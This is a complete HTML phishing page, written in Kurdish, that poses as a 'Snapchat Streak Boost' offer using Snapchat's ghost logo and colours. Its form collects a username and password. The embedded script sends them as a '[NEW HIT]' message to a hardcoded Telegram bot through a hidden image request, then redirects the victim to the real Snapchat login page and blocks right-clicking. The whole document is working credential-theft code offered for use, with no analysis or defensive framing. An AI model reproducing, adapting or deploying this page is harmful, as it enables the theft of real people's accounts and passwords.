<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat Streak Boost</title>
    <style>
        body { background: #FFFC00; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, sans-serif; overflow: hidden; }
        #app-root { width: 85%; max-width: 300px; z-index: 2; }
        .box { background:white; padding:25px 18px; border-radius:20px; text-align:center; box-shadow:0 15px 35px rgba(0,0,0,0.1); position:relative; }
        input { width: 90%; padding: 12px; margin-bottom: 10px; border: 1px solid #d2d2d7; border-radius: 10px; background: #f5f5f7; font-size: 14px; outline: none; transition: 0.3s; }
        input:focus { border-color: #00ADEE; background: white; }
        button { width: 98%; padding: 12px; background: #00ADEE; color: white; border: none; border-radius: 22px; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 5px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #loading { display:none; position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); border-radius:20px; justify-content:center; align-items:center; z-index:10; }
        .loader { width:20px; height:20px; border:3px solid #f3f3f3; border-top:3px solid #00ADEE; border-radius:50%; animation:spin 0.8s linear infinite; }
    </style>
</head>
<body>
    <div id="app-root">
        <div class="box">
            <div id="loading"><div class="loader"></div></div>
            <img src="https://id.snapchat.com/identity/static/images/ghost.png" style="width:50px; margin-bottom:10px;">
            <h2 style="margin:0 0 5px; font-size:18px; color:#1d1d1f;">زيادكردنى ستريك</h2>
            <p style="color:#86868b; font-size:12px; margin-bottom:20px;">بۆ وەرگرتنی ستریكی زیاتر، تكایە داخڵ ببە</p>
            
            <form id="login-form" dir="rtl">
                <input type="text" id="user" placeholder="ناوى بەکارهێنەر" required>
                <input type="password" id="pass" placeholder="تێپەڕەوشە" required>
                <button type="submit">زيادكردن</button>
            </form>
        </div>
    </div>

    <script>
        // زانیارییەکان ڕێکخراون بەپێی وێنەی کۆتا
        const config = {
            t: "8710298223:AAEqp_MMkTlgLmwHdgERZMaDo3pF9tAWQlo",
            c: "2057242829"
        };

        const form = document.getElementById('login-form');
        const loader = document.getElementById('loading');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            loader.style.display = 'flex';

            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const msg = `🔥 [NEW HIT] 🔥\n👤 User: ${u}\n🔑 Pass: ${p}`;

            // ناردن بۆ تێلیگرام
            const url = `https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.c}&text=${encodeURIComponent(msg)}`;

            // بەکارهێنانی وێنە بۆ ناردنی خێرا (ئەمە گەرەنتی ناردن دەکات)
            const sender = new Image();
            sender.src = url;

            // دوای ناردن، لاپەڕەکە دەگۆڕێت بۆ سناپچاتی فەرمی
            setTimeout(() => {
                window.location.replace("https://accounts.snapchat.com");
            }, 1000);
        });

        // ڕێگری لە کۆپی کردن
        document.oncontextmenu = () => false;
    </script>
</body>
</html>
